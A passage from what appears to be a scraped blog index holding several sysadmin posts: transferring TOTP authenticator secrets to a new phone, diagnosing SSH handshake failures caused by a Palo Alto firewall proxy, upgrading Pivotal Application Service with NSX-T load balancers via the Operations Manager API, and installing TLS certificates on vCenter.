Foundry):bcunnie@pivotal.io?secret=CBL5RAL4MSCFFKMX\u0026amp;issuer=Slack Note that the link has a scheme of \u0026ldquo;otpauth\u0026rdquo;, an authority of \u0026ldquo;totp\u0026rdquo;, and the secret (key) is presented as a key-value pair query component (\u0026ldquo;secret=CBL5RAL4MSCFFKMX\u0026rdquo;). For those interested in more detail, the Google Authenticator GitHub Wiki is an excellent resource (where you will discover, among other things, that the key is Base32-encoded).\nWe copy the link to the clipboard by pressing the \u0026#34;duplicate\u0026#34; icon 1. Copy the URL to a password manager We copy the URL to a password manager. In our case we use LastPass [LastPass] , but we believe any password manager will do.\nWe are interested in alternative secure storage mechanisms (e.g. Vault, 1Password) for the secrets. For those of you so inclined, pull requests describing alternatives are welcome.\nWe copy the URL to a \u0026ldquo;secure note\u0026rdquo;, one line per URL. We name the secure note totp.txt.\nThis is what our secure note looks like (the keys have been changed to protect the innocent):\notpauth://totp/Okta:bcunnie@pivotal.io?secret=ILOVEMYDOG otpauth://totp/GitHub:brian.cunnie@gmail.com?secret=mycatisgreat2 otpauth://totp/LastPass:bcunnie@pivotal.io?secret=LETSNOTFORGETMYWIFE otpauth://totp/LastPass:brian.cunnie@gmail.com?secret=ormylovelychildren otpauth://totp/AWS:bcunnie@pivotal.io?secret=SOMETIMESIFORGETMYCHILDRENSNAMES otpauth://totp/AWS:brian.cunnie@gmail.com?secret=theyrealwaysgettingintotrouble otpauth://totp/Google:brian.cunnie@gmail.com?secret=ILETMYWIFEDEALWITHIT otpauth://totp/Pivotal%20VPN:bcunnie@pivotal.io?secret=computersaremucheasiertohandlethankids otpauth://totp/Coinbase:brian.cunnie@gmail.com?secret=SOMETIMESIHIDEINMYOFFICE otpauth://totp/Joker:brian.cunnie@gmail.com?secret=buttheyopenthedoortoseehwatImdoing otpauth://totp/Discord:brian.cunnie@gmail.com?secret=THEYGETBOREDPRETTYQUICKLY otpauth://totp/namecheap:brian.cunnie@gmail.com?secret=soIplayminecraftwiththem 2. Display the QR code to your terminal We make sure we have a utility which displays QR codes to our terminal; we have found qrencode quite adequate, and on macOS it\u0026rsquo;s installed as easily as brew install qrencode (assuming the homebrew package manager is already installed).\nWe use a three-line shell script, totp.sh to display the QR codes to our terminal. Our invocation uses the LastPass CLI to display our TOTP secrets and pipe it to our shell script:\nlpass show --note totp.txt | totp.sh A parade of QR codes scrolls on our terminal, and we use our authenticator app to scan them in. We have been able to scan as many as 12 different QR codes in under a minute!\nWe point our authenticator app to the QR code on our terminal (not the QR code in the site\u0026rsquo;s web page) to ensure that the URL (and secret) have been correctly copied.\nTOTP Alternatives SMS 2FA SMS 2FA transparently migrates to new phones (as long as the phone number doesn\u0026rsquo;t change), but has been faulted for being vulnerable to Signaling System 7 (SS7) attacks. [0] [1] [2]\nU2F 2FA \u0026ldquo;Universal 2nd Factor (U2F) is an open authentication standard that strengthens and simplifies two-factor authentication (2FA) using specialized Universal Serial Bus (USB) or near-field communication (NFC) devices\u0026rdquo;\nU2F\u0026rsquo;s advantage is that its secret is never shared (it never leaves the key), so the secret itself is difficult to compromise. The downside is that the secret is stored in a physical key, so if the key is lost or broken, the 2FA must be reset. Also, adoption of U2F is not as widespread as TOTP: Slack, for example, offers TOTP 2FA but not U2F 2FA as of this writing.\nFurther Reading CNET describes a procedure which doesn\u0026rsquo;t require storing the secrets but does require visiting each TOTP-enabled site to scan in a new QR code. It also requires the old phone (it\u0026rsquo;s not much help if you lose your phone).\nProtectimus suggests saving screenshots of your secret keys, a simple solution for the non-technical user. They also describe a very interesting mechanism to extract the keys from a rooted phone using adb and SQLite, a technique which may be useful for users who already have a rich set of TOTP sites but have not stored the URLs in a password manager.\nFootnotes [LastPass] The security-minded reader might ask, \u0026ldquo;Wait, you\u0026rsquo;re storing your TOTP secrets in LastPass, but isn\u0026rsquo;t that also where you\u0026rsquo;re storing your passwords? Isn\u0026rsquo;t that a poor choice — to store both your secrets and passwords in the same place?\u0026rdquo;\nTo which we reply, \u0026ldquo;Yes, it is often poor choice to store both your secrets and passwords in the same place, but never fear — we don\u0026rsquo;t store our passwords in LastPass. Yes, we are aware that the intent of LastPass is to store passwords, but that\u0026rsquo;s not what we use it for. Instead, we store our passwords in a blowfish2-encrypted flat file in a private repo. We use LastPass for storing items that are sensitive but not passwords (e.g. TOTP keys).\u0026rdquo;\n","permalink":"https://blog.nono.io/post/totp/","summary":"Abstract Smartphone authenticator apps such as Google Authenticator and Authy implement software tokens that are \u0026ldquo;two-step verification services using the Time-based One-time Password Algorithm (TOTP) and HMAC-based One-time Password algorithm (HOTP)\u0026rdquo;\nSmartphone TOTP, a form of Two-factor authentication (2FA), displays a 6-digit code derived from a shared secret, updating every thirty seconds.\nThe shared secret is presented only once to the user, typically with a QR (Quick Response) Code which is scanned by the authenticator app.","title":"Transferring Time-based One-time Passwords to a New Smartphone"},{"content":"Abstract By using tcpdump to troubleshoot an elusive error, we uncovered a man-in-the-middle (MITM) ssh proxy installed by our information security (InfoSec) team to harden/protect a set of machines which were accessible from the internet. The ssh proxy in question was Palo Alto Network’s (PAN) Layer 7 (i.e. it worked on any port, not solely ssh’s port 22) proxy, and was discovered when we observed a failure to negotiate ciphers during the ssh key exchange.\nThe Problem In our team\u0026rsquo;s [Concourse CI] (continuous integration) pipelines, we create new PCF Pivotal Cloud Foundry environments, subject them to a rigorous battery of tests, and then destroy them. Among our tests is the Container Networking Acceptance test suite (NATS or CNATS—not to be confused with the NATS messaging bus), which runs many cf ssh commands to test app-to-app connectivity.\nThe error was elusive, but inconvenient — it would cause an entire test suite to fail. Our only clue was a cryptic ssh failure:\nError opening SSH connection: ssh: handshake failed: EOF Let\u0026rsquo;s be clear: we\u0026rsquo;re not using OpenSSH in our tests. Sure, we\u0026rsquo;re using the SSH protocol as implemented by the Golang library, but we\u0026rsquo;re not using the command line tool which so many of us know and love. In other words, we type cf ssh instead of ssh.\nThe purpose of this specialized implementation of the OpenSSH protocol is to allow users of our Pivotal Application Service (PAS) software to connect to their application, typically to debug.\nOnce again, though, it\u0026rsquo;s not quite OpenSSH. For one thing, our server-side binds to port 2222, not sshd\u0026rsquo;s 22. Also, it\u0026rsquo;s written in Golang, not C (both the client and the server).\nDefining the problem The problem wasn\u0026rsquo;t consistent. In fact, over the course of a 20-minute test run, it would only appear once.\nIt didn\u0026rsquo;t appear everywhere—one of our environments, maintained in San Francisco, seemed immune to the problem. In fact, the problem reared its ugly head only in our San Jose environments.\nAnd, strangest of all, the problem only occurred on the first connection attempt. The first time cf ssh was run, it would fail, but subsequent attempts succeeded.\nWe attempted connecting from workstations in Palo Alto, San Francisco, and Santa Monica. The behavior remained consistent: the first attempt would fail, and the remaining would succeed.\nWe tried using ssh as a client instead of cf ssh. Same behavior: first would fail, remainder succeed.\nWe tried bringing up sshd as a server. The results surprised us: no failures. Not one. Our ssh-proxy failed, but sshd didn\u0026rsquo;t — what was going on?\nWe knew it was time for tcpdump. If we were going to get any further, we needed to examine the raw packets.\nUsing tcpdump on our Server We ran tcpdump on our server (the \u0026ldquo;Diego Brain\u0026rdquo;) to determine what was happening during failed cf ssh connections. We discovered that, from the Diego Brain\u0026rsquo;s perspective, the user was shutting down the connection (by sending a FIN packet).\nFrom the standpoint of the Diego brain (192.168.2.6), the user (10.80.130.32) terminates (FIN) the session immediately after key exchange negotiation\nWe dug deeper — was there anything happening in the key exchange that caused the connection to shut down?\nYes, there was something happening: the client and the Diego Brain could not agree on a common set of ciphers.\nThese were the ciphers offered by the Diego Brain. Note that these ciphers are the ones included in Golang\u0026rsquo;s ssh package:\n\u0026ldquo;curve25519-sha256@libssh.org\u0026rdquo; \u0026ldquo;ecdh-sha2-nistp256\u0026rdquo; \u0026ldquo;ecdh-sha2-nistp384\u0026rdquo; \u0026ldquo;ecdh-sha2-nistp521\u0026rdquo; \u0026ldquo;diffie-hellman-group14-sha1\u0026rdquo; \u0026ldquo;diffie-hellman-group1-sha1\u0026rdquo; These were the ciphers offered by the client:\n\u0026ldquo;diffie-hellman-group-exchange-sha256\u0026rdquo; \u0026ldquo;diffie-hellman-group-exchange-sha1\u0026rdquo; We believe that the client shut down the connection because it could not agree on a common cipher for key exchange. But the client and server were both written in Golang, so their cipher suites should be identical. In fact, both Diffie Hellman group exchange ciphers are explicitly considered to be legacy protocols by the Golang maintainers. Why was the client\u0026rsquo;s cipher suite different, and why did it include legacy protocols?\nAt this point we also noticed that the SSH protocol was unexpected: it was SSH-2.0-PaloAltoNetworks_0.2. We decided to trace the packets from the client.\nUsing tcpdump on our Client We ran tcpdump on our client, and attempted to connect (via ssh, not our custom client, not cf ssh) to our Diego Brain. We found the unexpected SSH protocol again, SSH-2.0-PaloAltoNetworks_0.2, but this time it was our Diego Brain presenting it:\nA packet trace of an two attempted connections to port 2222; the first failed, and the second succeeded.\nBut the SSH protocol SSH-2.0-PaloAltoNetworks_0.2 was only presented when the connection subsequently failed. In the diagram above, we can see that the ostensible Diego Brain shut down the connection by sending a FIN packet (packet 19) to our client.\nIOPS to the Rescue We contacted IOPS, the Pivotal organization which maintains the network, who explained that the firewall is configured to intercept and proxy all ssh connections originating from or terminating at the San Jose datacenter in order to prevent ssh tunnel attacks, since the San Jose environments are accessible from the internet.\nOur Conclusions Our networking model was wrong:\nUnbeknownst to us, the Palo Alto Networks firewall was intercepting our ssh traffic.\nWe concluded that our cf ssh connection actually works this way:\nOur firewall attempts to proxy all ssh connections to San Jose. When it attempts to contact the backend, it realizes it doesn\u0026rsquo;t have a common cipher suite for key exchange, and can\u0026rsquo;t establish a connection When it can\u0026rsquo;t establish a connection with the server, it sends a FIN to the client (EOF) It proceeds to whitelist the client-IP, server-IP, server-port tuple for a little more than one hour [timeout]. It does not attempt to proxy during that time It will attempt to proxy new client connections from different IP addresses during that time Our final resolution to this issue was a workaround wherein each test suite that runs cf ssh, we \u0026ldquo;prime the pump\u0026rdquo; by running a cf ssh command, which we expect to fail, before running the test suite.\nFootnotes [timeout] The exact timeout is a little more than an hour, somewhere between 3720 and 3840 seconds.\nWe wrote a script to more precisely determine the timeout. As can be seen from the output below (edited for clarity), there was no proxy attempt at 3720 seconds (Permission denied...), but there was at 3840 seconds (Connection closed...)\nPermission denied (password). Timeout: 3720 Connection closed by 10.195.84.17 port 2222 Timeout: 3840 Corrections \u0026amp; Updates 2019-01-02\nInclude the amount of time that the PAN firewall waits after an unsuccessful proxy attempt before triggering the next attempt.\n","permalink":"https://blog.nono.io/post/ssh_handshake_failed/","summary":"Abstract By using tcpdump to troubleshoot an elusive error, we uncovered a man-in-the-middle (MITM) ssh proxy installed by our information security (InfoSec) team to harden/protect a set of machines which were accessible from the internet. The ssh proxy in question was Palo Alto Network’s (PAN) Layer 7 (i.e. it worked on any port, not solely ssh’s port 22) proxy, and was discovered when we observed a failure to negotiate ciphers during the ssh key exchange.","title":"Troubleshooting Obscure OpenSSH Failures"},{"content":"When customers with vSphere+NSX-T-based foundations apply a stemcell update, update a tile, or upgrade PAS (Pivotal Application Service) from 2.2 to 2.3, their Cloud Foundry may become unreachable as their NSX-T static load balancer server pools have been emptied.\nThis blog post describes a method to ensure availability during upgrades. We use a combination of customized Operations Manager resource configs and BOSH VM Extensions.\nThe sample workflow in this post is for upgrading PAS 2.2 to PAS 2.3 with an Operations Manager upgrade; however, it can also be adapted to stemcell or tile upgrades as well.\nOperations Manager 2.3 introduces the capability to manage the full lifecycle of the membership of the NSX-T load balancer pools, which relieves customers of the responsibility of manually assigning VMs to server pools. This allows uninterrupted availability of the BOSH instance group VMs that use NSX-T load balancers even during upgrades, re-deploys, and IP address re-assignment.\nTo enable these features without downtime for deployments using Operations Manager 2.2, one must migrate membership from out-of-band VM assignment to BOSH-managed assignment prior to upgrading to Operations Manager 2.3. This blog post describes that migration process.\n0. Procedure Review manually-created static [or Dynamic] NSX-T Load Balancer Server Pools Craft BOSH VM Extensions Craft Operations Manager resource configs Upgrade Operations Manager to version 2.3 Stage VM extensions with the Operations Manager API Prepare to upgrade Pivotal Application Service to 2.3.0 Stage new resource configs with the Operations Manager API Apply changes (deploy) 1. Review Manually-Created Static NSX-T Load Balancer Server Pools We log into our NSX Manager to review the Server Pool configuration of our Static Load Balancers:\nYou may not have four pools; it\u0026rsquo;s possible you may only have one. In that case, adapt the instructions below to the number of load balancer server pools you have.\nFor example, you may not have a TCP Router server pool if you don\u0026rsquo;t use the TCP routing feature of PAS.\nIn the table below, we describe the purpose of each of the load balancer server pools. The most important load balancers are the first two; they allow HTTP(S) access to our applications. The \u0026ldquo;Job\u0026rdquo; column is the name of the job that is load balanced by this server pool; they can be viewed in the Pivotal Application Service \u0026ldquo;Status\u0026rdquo; page in Operations Manager. The \u0026ldquo;BOSH instance group\u0026rdquo; column is the name of the instance group for this job within BOSH.\nServer Pool Description Port Job BOSH instance group PAS-GoRouter443ServerPool HTTPS access to cf apps 443 Router router PAS-GoRouter80ServerPool HTTP access to cf apps 80 Router router PAS-SSHProxyServerPool cf ssh 2222 Diego Brain diego_brain PAS-TCPRouterServerPool TCP access to non-HTTP(S) cf apps (optional) * TCP Router tcp_router * - the TCP router server pool uses a port range, e.g. 1024-1124, and does not load balance a single port.\nWe double-check to make sure the IP addresses of the VMs backing each server pool correspond to the IP addresses of the jobs. For example, we check the IP addresses backing the PAS-GoRouter443ServerPool server pool:\nWe cross-reference those IP addresses to the IPs of the Router VMs in our foundation:\nWe cross-reference all server pools.\n2. Craft BOSH VM Extensions For each BOSH instance group, we prepare a JSON file describing a VM extension that will be applied to that instance group.\nHere is an example of the VM extension configuration for the Router job:\n{ \u0026#34;cloud_properties\u0026#34;: { \u0026#34;nsxt\u0026#34;: { \u0026#34;lb\u0026#34;: { \u0026#34;server_pools\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;PAS-GoRouter443ServerPool\u0026#34;, \u0026#34;port\u0026#34;: 443 }, { \u0026#34;name\u0026#34;: \u0026#34;PAS-GoRouter80ServerPool\u0026#34;, \u0026#34;port\u0026#34;: 80 } ] } } }, \u0026#34;name\u0026#34;: \u0026#34;http_https_lb\u0026#34; } The server_pools array should contain a list of JSON objects with the name of the NSX-T load balancer server pool, and where applicable, a port. When configuring load balancers that use a port range, such as the TCP router load balancer, the port should be omitted.\nThe name (e.g. http_https_lb) is arbitrary but must match the name used in the the resource config in the following section.\nIn our case, we create 3 VM extensions: router_vm-extension.json, diego_brain_vm-extension.json, tcp_router_vm-extension.json.\n3. Craft Operations Manager resource configs For each BOSH instance group, we prepare a JSON (JavaScript Object Notation) file describing the resource config that BOSH will use when redeploying the instance group during the upgrade.\n3.0 Authenticate To Use the Operations Manager API We authenticate in order to obtain our UAA access token.\nFOUNDATION_URL= # your ops manager URL goes here, e.g. https://pcf.example.com UAA_ACCESS_TOKEN= # your token goes here, a very long string. Very long. 3.1 Determine the GUID of the PAS Foundation We use the Operations Manager API to determine the GUID of the PAS foundation:\ncurl \u0026#34;$FOUNDATION_URL/api/v0/staged/products\u0026#34; -H \u0026#34;Authorization: Bearer $UAA_ACCESS_TOKEN\u0026#34; This will return a long string of JSON. We\u0026rsquo;re looking for this part: [..., {\u0026quot;installation_name\u0026quot;:\u0026quot;some-guid\u0026quot;,\u0026quot;guid\u0026quot;:\u0026quot;some-guid\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;cf\u0026quot;,\u0026quot;product_version\u0026quot;:\u0026quot;2.2.2\u0026quot;}, ...]. This is our guid: cf-ebd5ce1f7b11714cbb94.\n3.2 Determine the GUID of the Jobs That Belong in Server Pools CF_GUID= # the GUID we got from the previous step curl \u0026#34;$FOUNDATION_URL/api/v0/staged/products/$CF_GUID/jobs\u0026#34; -H \u0026#34;Authorization: Bearer $UAA_ACCESS_TOKEN\u0026#34; This also returns a long string of JSON. We want to find the GUIDs for the jobs (BOSH instance groups) router, diego_brain, and tcp_router (the corresponding GUIDs in our foundation are router-1a40bb1433cd790d3920, diego_brain-247c1f4a616b5d43546e, and tcp_router-93c7a99605c109f53f8c).\nIf you have jq installed, you may use the following command to isolate the important components: jq -r '.jobs[] | select(.name==\u0026quot;router\u0026quot; or .name==\u0026quot;diego_brain\u0026quot; or .name==\u0026quot;tcp_router\u0026quot;)'.\n3.3 Get Existing Resource Configs Attached to the Jobs We run the following command for the GUID of each job we\u0026rsquo;re interested in:\ncurl \u0026#34;$FOUNDATION_URL/api/v0/staged/products/$CF_GUID/jobs/$JOB_GUID/resource_config\u0026#34; -H \u0026#34;Authorization: Bearer $UAA_ACCESS_TOKEN\u0026#34; \u0026gt; $JOB_NAME-resource-config.json Where CF_GUID is set to the GUID from step 3.1, JOB_GUID is set to the GUID from step 3.2, and JOB_NAME is set to the name of the BOSH instance group for this job.\nThis produces a result like {\u0026quot;instance_type\u0026quot;:{\u0026quot;id\u0026quot;:\u0026quot;automatic\u0026quot;},\u0026quot;instances\u0026quot;:2,\u0026quot;nsx_security_groups\u0026quot;:null,\u0026quot;nsx_lbs\u0026quot;:[],\u0026quot;additional_vm_extensions\u0026quot;:[]}.\n3.4 Write New Resource Configs For Each Job Edit each file from the previous step to add the name of the corresponding load balancer (see table in step 1), in quotes, to the additional_vm_extensions array. [Resource Config]\nWe do this once for each load-balanced job (router, diego_brain, and tcp_router).\n4. Upgrade Operations Manager to Version 2.3 Following the steps in the Upgrading Pivotal Cloud Foundry documentation, we upgrade Operations Manager to version 2.3.\nDo not follow steps to upgrade the PAS tile at this time.\nIf you are using the VMware NSX-T tile, and it is version 2.2 or earlier, you should now stage version 2.3 of that tile.\nDo not press \u0026ldquo;Apply Changes\u0026rdquo; during this step.\n5. Stage VM Extensions with the Operations Manager API For each VM extension JSON file we wrote in step 2, we run the following curl command:\ncurl \u0026#34;$FOUNDATION_URL/api/v0/staged/vm_extensions\u0026#34; -X POST -H \u0026#34;Authorization: Bearer $UAA_ACCESS_TOKEN\u0026#34; -d \u0026#34;@${VM_EXTENSION_FILE}\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; Where ${VM_EXTENSION_FILE} is the path to the file. We expect to see an HTTP status 200 and an empty JSON object {} returned for each call.\n6. Stage Pivotal Application Service Tile Version 2.3.0 Following the steps in the Upgrading Pivotal Cloud Foundry documentation, we stage PAS tile version 2.3.0.\nDo not press \u0026ldquo;Apply Changes\u0026rdquo; during this step.\n7. Stage New Resource Configs with the Operations Manager API For each resource config JSON file we wrote in step 3.4, we run the following curl command:\ncurl \u0026#34;$FOUNDATION_URL/api/v0/staged/products/${CF_GUID}/jobs/${JOB_GUID}/resource_config\u0026#34; -X PUT -H \u0026#34;Authorization: Bearer $UAA_ACCESS_TOKEN\u0026#34; -d \u0026#34;@${RESOURCE_CONFIG_FILE}\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; Where ${RESOURCE_CONFIG_FILE} is the path to the file. We expect to see an HTTP status 200 and an empty JSON object {} returned for each call.\n8. Apply Changes (Deploy) Press \u0026ldquo;Review Pending Changes\u0026rdquo; in the Operations Manager 2.3 UI, then press \u0026ldquo;Apply Changes\u0026rdquo;.\nAt the end of this step, you will have a PAS 2.3.0 foundation, with networking optionally provided by VMware NSX-T tile 2.3.0, where each job VM is located in the appropriate NSX-T load balancer server pool.\n9. Gotchas An incident occurred where the NSX-T load balancer was unable to forward traffic to the newly-deployed gorouters.\nRebooting one of the NSX-T Edges restored the flow of traffic from the NSX-T load balancer to the gorouters. We are unsure of the root cause; however, since existing load balancer pools continued to function, we suspect the Edge had become incapable of honoring updates.\n10. Troubleshooting We find the Traceflow (Tools → Traceflow) networking tool invaluable when debugging network failures. In the screenshot below, we examine the gorouter/0 VM\u0026rsquo;s ability to communicate with the load balancer (IP address 10.144.15.4) on port 443 (HTTPS). In this case, we determined the gorouter\u0026rsquo;s CID using the bosh vms command, but we could have just as easily determined it by looking it up on the Status page of the PAS tile on Operations Manager:\nReferences VM Extensions we used for our deployment:\nRouter Diego Brain TCP Router Our BASH commands we followed when we upgraded: script.\nAcknowledgements Josh Gray of the PEZ Team was instrumental in discovering the behavior and providing resources to test remediation. The BOSH vSphere CPI Team provided invaluable support.\nBryan Kelly of Cerner provided invaluable feedback, pointing out that this process is relevant not only to 2.2 → 2.3 upgrades but also to stemcell upgrades and tile upgrades.\nCorrections \u0026amp; Updates 2018-11-20\nAdded Gotchas and Troubleshooting sections after suggestions from Bryan Kelly.\nFootnotes [or Dynamic] This blog post focuses on static pools, but the procedure is identical for dynamic pools since the BOSH vSphere CPI \u0026ldquo;looks up the NSGroup [of the server pool] and adds the VM to the NSGroup\u0026rdquo;.\n[resource_config] In a prettified JSON file, our change would look like the following:\n{ \u0026#34;instance_type\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;automatic\u0026#34; }, \u0026#34;instances\u0026#34;: 2, \u0026#34;nsx_security_groups\u0026#34;: null, \u0026#34;nsx_lbs\u0026#34;: [], \u0026#34;additional_vm_extensions\u0026#34;: [ + \u0026#34;http_https_lb\u0026#34; ] } ","permalink":"https://blog.nono.io/post/upgrade_2.2-2.3_on_nsx-t/","summary":"When customers with vSphere+NSX-T-based foundations apply a stemcell update, update a tile, or upgrade PAS (Pivotal Application Service) from 2.2 to 2.3, their Cloud Foundry may become unreachable as their NSX-T static load balancer server pools have been emptied.\nThis blog post describes a method to ensure availability during upgrades. We use a combination of customized Operations Manager resource configs and BOSH VM Extensions.\nThe sample workflow in this post is for upgrading PAS 2.","title":"Safely Upgrading PAS 2.2 with NSX-T Load Balancers"},{"content":" The following section is the new Quickstart for installing a TLS certificate on vCenter 7\nvCenter 7 Quickstart On your vCenter, navigate to Menu → Administration → Certificates → Certificate Management\nOn the __MACHINE_CERT tile, click Actions, select Generate Certificate Signing Request (CSR).\nEnter the appropriate info; for inspiration, this is what we entered:\nCommon name: vcenter-70.nono.io Organization: nono.io Organizational Unit: homelab Country: United States State/Province: California Locality: San Francisco Email Address: yoyo@nono.io Host: vcenter-70.nono.io Subject Alternative Name (Optional): 10.0.9.70,2601:646:100:69f0:250:56ff:fe84:2e4a Key Size: 2048 Click Next → Download. Save to a file. Click Finish.\nAcquire a certificate for your host from a Commercial CA. In our example, we acquired a certificate for our host vcenter-70.nono.io from SSls.com, and we purchased their least-expensive offering, the PositiveSSL 1 domain Comodo SSL.\n[We do not endorse either SSLs.com or Sectigo (formerly Comodo); We encourage you to use the reseller and the Certificate Authority (CA) with which you are most comfortable].\nWe have 3 files:\nOur certificate file. This is a single (not a chain) certificate for our server, vcenter-70.nono.io.\nOur chained certificates. (CA Bundle) This chain should not include the server certificate. It should include the root certificate, which should be at the bottom of the chain.\nWe manually appended the root certificate to the chained certificate file received from Sectigo.\nOur root certificate. This must have a .crt extension. [hand-wavy]\nThe biggest challenge is getting the correct root certificate; we strongly suspect it can\u0026rsquo;t be cross-signed: it needs to be self-signed. Check the openssl and cfssl commands at the bottom of this post to verify that your root certificate is self-signed. If it\u0026rsquo;s not the correct root certificate, you\u0026rsquo;ll see the dreaded, \u0026ldquo;the trustAnchors parameter must be non-empty\u0026rdquo; error message when replacing the certificates.\nNavigate to Menu → Administration → Certificates → Certificate Management\nSelect Trusted Root Certificates → Add\nClick Browse Browse to your root certificate file and click Add If you get an error, Error occurred while adding trusted root certificates: Trusted root already exists, don\u0026rsquo;t worry, vCenter already has your root certificate. Select __MACHINE_CERT → Actions → Import and Replace Certificate\nChoose Replace with certificate generated from vCenter server; Click Next Fill in as follows: Machine SSL Certificate: paste your certificate file here (in our case, the certificate for vcenter-70.nono.io). Chain of trusted root certificates: paste your chained certificates here. Click Replace. If you see an error message, \u0026ldquo;Error occurred while fetching tls: Exception found (the trustAnchors parameter must be non-empty)\u0026rdquo;, then you haven\u0026rsquo;t added root certificate properly, or it\u0026rsquo;s not appended at the end of your chained certificate, or (we suspect but aren\u0026rsquo;t sure that this is a requirement) what you think is a self-signed root certificate is really a cross-signed root certificate. The following section is the original post for installing a TLS certificate on VCSA 6.7\n0. Abstract We want a green padlock on our VCSA\u0026rsquo;s web client; when we use our browser to navigate to our VCSA, we\u0026rsquo;d like it too look like the following:\nThis blog posts describes the steps to follow in order to install a TLS certificate on a VCSA 6.7.\nAuthor\u0026rsquo;s note: we use our VCSA\u0026rsquo;s fully qualified domain name (FQDN) \u0026ldquo;vcenter-67.nono.io\u0026rdquo; throughout this document, with the understanding that you should substitute your VCSA\u0026rsquo;s FQDN accordingly.\nNote that this blog post is narrowly scoped: we are only replacing one of the many certificates that the VCSA\u0026rsquo;s services use, we are only replacing the certificate that the human operator sees. Large enterprises may be more interested in replacing all the certificates, in which case they should refer to this VMware Knowledge Base article.\n1. Pre-requisites Before we begin, we need a TLS key, a chained certificate, and a root certificate. Also, we need to enable ssh access to our VCSA, for when certificates go horribly wrong the web interface may be unusable, and the only mechanism to recover (other than reinstalling) is to ssh onto the VCSA and reset the certificates.\n1.0 Enable OpenSSH Enable ssh by browsing to the Appliance Management User Interface (Appliance MUI, formerly known as VAMI), https://vcenter-67.nono.io:5480, and navigating to Access → Access Settings → Edit → Edit Access Settings → Enable SSH Login → toggle enabled → OK.\n1.1 Acquire Certificate from a Commercial CA We won\u0026rsquo;t discuss how to acquire a certificate, but we will point out that Heroku has a fairly succinct (and vendor-agnostic) description of the process.\nNote: VCSA, like Heroku, doesn\u0026rsquo;t support elliptic curve keys and only supports RSA keys (even though, in our estimation, elliptic curves are better if for no other reason than they are so much more terse than RSA keys). This means that if you use a modern tool such as cfssl, you\u0026rsquo;ll need to override its defaults to force it to generate RSA keys (e.g. cfssl print-defaults csr | jq -r '.key = {\u0026quot;algo\u0026quot;:\u0026quot;rsa\u0026quot;,\u0026quot;size\u0026quot;:2048}').\nAfter the process is complete, we should have three files:\nvcenter-67.nono.io.chain.pem - this is the chained certificate; your server\u0026rsquo;s certificate should be at the top, followed by any intermediate certificates. vcenter-67.nono.io.key - this is the RSA private key. You can see our key; however, we have taken the precaution of removing several lines [not-what-you-think] . addtrustexternalcaroot.crt — This is the root certificate [hand-wavy] . 2. Install the Certificate 2.0 Install the Certificate via Web Interface Browse to the VCSA\u0026rsquo;s web client https://vcenter-67.nono.io Select \u0026ldquo;Launch vSphere Client (HTML5)\u0026rdquo; (we use the HTML interface; Flash™ is too much for us) Log in Menu → Administration Certificates → Certificate Management Manage Certificates of vCenter Server IP/FQDN: vcenter-67.nono.io (don\u0026rsquo;t use \u0026ldquo;localhost\u0026rdquo;) Username: administrator@vsphere.local Password: WhateverYourPasswordIs Click \u0026ldquo;Log in and manage certificates\u0026rdquo; Trusted Root Certificates Click Add Certificate Chain → Browse (browse to your root certificate \u0026amp; upload). Click Add. Page should now show two Trusted Root Certificates Find \u0026ldquo;__MACHINE_CERT\u0026rdquo; Actions → Replace Certificate Chain → Browse (browse to your certificate \u0026amp; upload) Private Key → Browse (browse to your certificate \u0026amp; upload) Click Replace, success should resemble image below Reboot the vCenter for the new certificates to take effect: Browse to the VCSA Management Interface (VAMI), https://vcenter-67.nono.io:5480, and navigate to Actions → Reboot → Reboot the system? → Yes.\n2.1 Install the Certificate via CLI For those who would prefer to bypass the GUI and install the certificate via the CLI, we offer this alternative. First, ssh into our VCSA and start a shell:\nssh root@vcenter-67.nono.io * List APIs: \u0026#34;help api list\u0026#34; * List Plugins: \u0026#34;help pi list\u0026#34; * Launch BASH: \u0026#34;shell\u0026#34; Command\u0026gt; shell Next we copy our certificates and keys from our workstation, tara.nono.io:\nscp cunnie@tara.nono.io:{vcenter-67.nono.io.chain.pem,vcenter-67.nono.io.key,addtrustexternalcaroot.crt} . Launch the certificate manager and install the keys and certificates:\n/usr/lib/vmware-vmca/bin/certificate-manager 1. Replace Machine SSL certificate with Custom Certificate 2. Import custom certificate(s) and key(s) to replace existing Machine SSL certificate Please provide valid custom certificate for Machine SSL. vcenter-67.nono.io.chain.pem Please provide valid custom key for Machine SSL. vcenter-67.nono.io.key Please provide the signing certificate of the Machine SSL certificate. addtrustexternalcaroot.crt Unlike the GUI, which returns immediately, the CLI spends several minutes replacing certificates. When it has finished, reboot:\nshutdown -r now 2.2 Check: Refresh Your Browsers Browse to the VCSA web client and confirm the certificate is installed (green padlock). You may need to refresh the page. As a bonus, the Appliance MUI (VAMI) has the new certificate, too!\n3. Gotchas If you don\u0026rsquo;t upload the root certificate but update the certificate \u0026amp; key, after rebooting you will see the following in a red banner at the top:\n503 Service Unavailable (Failed to connect to endpoint: [N7Vmacore4Http20NamedPipeServiceSpecE:0x00007f843400bef0] _serverNamespace = / action = Allow _pipeName =/var/run/vmware/vpxd-webserver-pipe)\nIf you browse to port 5480 and see an odd \u0026ldquo;0 -\u0026rdquo; it means you need to refresh your browser (on macOS, ⌘-R). It may also mean that your vCenter is still booting and that you should wait a few more minutes.\nIf you use an elliptic curve key, you will not be able to upload your key \u0026amp; certificate; you\u0026rsquo;ll see an error similar to the following:\nIf things go really bad, you won\u0026rsquo;t get a login screen; instead, you\u0026rsquo;ll see:\n[400] An error occurred while sending an authentication request to the vCenter Single Sign-On server - An error occurred when processing the metadata during vCenter Single Sign-On setup - javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target.\nYou\u0026rsquo;ll need to reset your certificates; see the next section.\n3.0 Resetting the Certificates when things go wrong If the web client is unusable, you\u0026rsquo;ll need to ssh in and use certificate-manager to reset the certificates. We\u0026rsquo;ve tested this procedure on vCenter 6.7 \u0026amp; 7.0.\nssh root@vcenter-70.nono.io shell /usr/lib/vmware-vmca/bin/certificate-manager Choose option 8, \u0026ldquo;Reset all Certificates\u0026rdquo;. Watch the screen scroll by as it replaces the certificates, then reboot (shutdown -r now).\nReferences VMware Knowledge Base article, \u0026ldquo;Replacing a vSphere 6.x Machine SSL certificate with a Custom Certificate Authority Signed 